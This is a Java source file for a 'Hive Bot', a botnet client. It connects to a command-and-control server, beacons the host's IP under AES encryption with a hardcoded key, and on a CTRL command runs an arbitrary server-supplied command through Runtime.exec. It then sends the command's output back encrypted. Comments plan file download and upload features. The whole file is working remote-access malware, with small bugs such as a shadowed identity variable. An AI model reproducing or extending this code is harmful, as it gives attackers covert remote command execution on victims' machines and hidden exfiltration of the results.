// Programmer: q0m
// Date: 1/21/2017
// Description: Java Hive Bot 

/*
// TERM -- terminates the connection
// CTRL -- send a command to the console and executes it
// ACK  -- Acknowledges the server has been registered in the C&C server
To do:
// GRAB -- downloads a file from a remote web resource
// PUSH -- pushes a file to the remote web resource
// PING -- pings the server to ensure server is avail
		
		
// Connection is made to the Hive
// Hive registers the server and sends an ACK 
// Hive awaits instruction.  
*/

import java.applet.Applet;
import java.awt.*;
import java.net.*;
import java.io.*;
import java.util.List;
import java.util.ArrayList;
/* ------------------------ Adding crypto libs ---------------- */
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;


public class jBotx 
{
	public static Socket socket;
	public static DataInputStream inStream;
	public static PrintStream outStream;
	public static String ident;
	public static InetAddress IP;
	
	public static void main(String args[]) 
	{

      final String secretKey = "SupportFreeInformation";

		// Connect to specified host on specified port
		try
		{
         String inetaddr;
         int portNum;
         inetaddr = args[0];
         portNum = Integer.parseInt(args[1]);

			socket = new Socket(inetaddr, portNum); // connects upon creation
		}
		catch(Exception exc)
		{
			System.out.println("Usage: java jBot.java [server] [port]");
         return;
		}


      // Iinitalize the network from the newly created socket
      try
      {

   		inStream = new DataInputStream(socket.getInputStream()); 
   		outStream = new PrintStream(socket.getOutputStream());
   		IP = Inet4Address.getLocalHost();
         String nodeID = "JRE-NODE " + IP.getHostAddress();
         String ident = AES.encrypt(nodeID, secretKey);
      }
      catch (Exception exc)
      {
         System.out.println("Error in network initialization" + exc.toString());
      }
		
		try
		{
                  //DATA STREAM - BEACON_ID
         String beacon_ID = "JRE-NODE " + IP.getHostAddress();
         String encrypted_beacon = AES.encrypt(beacon_ID, secretKey);
         outStream.println(encrypted_beacon);
                  //DATA STREAM - Done
		}
		catch (Exception exc)
		{
			System.out.println("Error communicating with the Hive.");
		}
		
		System.out.println("\nConnected to the Hive.  Awaiting instruction...");
		String data = new String();
      String encryptedData = AES.encrypt(data, secretKey);
      System.out.println(encryptedData);
		int status = 1;
		while (true)
		{
			while (true)
			{
				try
				{
					data = inStream.readLine();
				}
				catch (Exception exc)
				{
					System.out.println("Hive server unavailable.  Quitting...");
					System.exit(-1);					
				}

				// Analyze the protocol
				if (data.toUpperCase().contains("ACK"))
				{

               String beacon_ID = "JRE-NODE " + IP.getHostAddress();
               String encrypted_beacon = AES.encrypt(beacon_ID, secretKey);
               outStream.println(encrypted_beacon);

					outStream.println(ident);
					System.out.println("Hive server acknowledged agent.");
				}	
				else if (data.toUpperCase().contains("TERM"))
				{
					try 
               { 
                  socket.close(); 
               } 
               catch (Exception exc) 
               {
                  System.out.println("Error: " + exc); 
               }
				}
            
				else if (data.toUpperCase().contains("CTRL"))
				{


                  //DATA STREAM - COMMAND ACKNOLWEDGED
               String command_ack = "Command recieved from " + IP.getHostAddress();
               String encrypted_ack = AES.encrypt(command_ack, secretKey);
               outStream.println(encrypted_ack);
                  //DATA STREAM - Complete
					String[] dataArray      = null;
					BufferedReader stdInput = null;
					BufferedReader stdError = null;
					String s                = null;
               String line             = null;
               List<String> records    = new ArrayList<String>();
					try
					{
						dataArray = data.split("\\s+");

						Process p = Runtime.getRuntime().exec(dataArray[1]);
						stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
						stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));
						s = stdInput.readLine();
                  //Encrypting the data to send out
                  //String encrypted_s = AES.encrypt(s, secretKey);
                  //System.out.println(encryptedData);                  

                  while ((line = stdInput.readLine()) != null)
                  {
                     records.add(line);
                     String encrypted_line = AES.encrypt(line, secretKey);
                     outStream.println(encrypted_line);
                     //outStream.println(line);
                  }
						
					}
					catch (Exception exc) 
               {
                  System.out.println("Error: " + exc); 
               }
				}
				else
				{
					System.out.println(data + " is an unrecognized command.");
				}
				
			}

		}

	}
}
		

